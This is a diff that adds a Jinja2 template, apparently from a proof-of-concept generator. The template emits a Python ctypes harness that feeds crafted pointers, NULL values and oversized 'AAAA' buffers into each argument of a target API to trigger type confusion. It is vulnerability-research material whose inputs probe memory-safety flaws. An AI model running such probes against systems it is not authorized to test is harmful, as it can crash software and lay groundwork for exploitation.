@@ -1,0 +1,48 @@
+{% extends "poc/base.py.j2" %}
+
+{% block description %}Type confusion vulnerability{% endblock %}
+
+{% block payload %}
+# Type confusion test values
+def get_type_test_values():
+    return [
+        (ctypes.c_int64(0x41414141), "Integer as pointer"),
+        (ctypes.c_char_p(b"AAAA" * 64), "String buffer"),
+        (ctypes.c_void_p(0x41414141), "Crafted pointer"),
+        (ctypes.c_void_p(0), "NULL pointer"),
+        (ctypes.c_double(3.14159), "Float value"),
+    ]
+{% endblock %}
+
+{% block exploit_doc %}Trigger type confusion{% endblock %}
+
+{% block exploit_body %}
+        print(f"[*] Sink API: {{ sink_api }}")
+{% if arg_count and arg_count > 1 %}
+        print(f"[*] Function takes {{ arg_count }} arguments")
+{% endif %}
+
+        test_values = get_type_test_values()
+
+        # 测试每个参数位置
+        for arg_idx in range(min(ARG_COUNT, 4)):
+            print(f"\n[*] Testing argument {arg_idx}:")
+            for val, desc in test_values:
+                print(f"\n[*] Testing: {desc}")
+                try:
+                    # 构建参数
+                    args = []
+                    for i in range(ARG_COUNT):
+                        if i == arg_idx:
+                            args.append(val)
+                        else:
+                            args.append(arg_builder.get_buffer_ptr(i))
+                    result = func(*args)
+                    print(f"    -> Returned: {result}")
+                except OSError as e:
+                    print(f"    -> Windows Error: {e}")
+                except Exception as e:
+                    print(f"    -> Exception: {type(e).__name__}: {e}")
+
+        print("\n[+] All type confusion tests completed")
+{% endblock %}
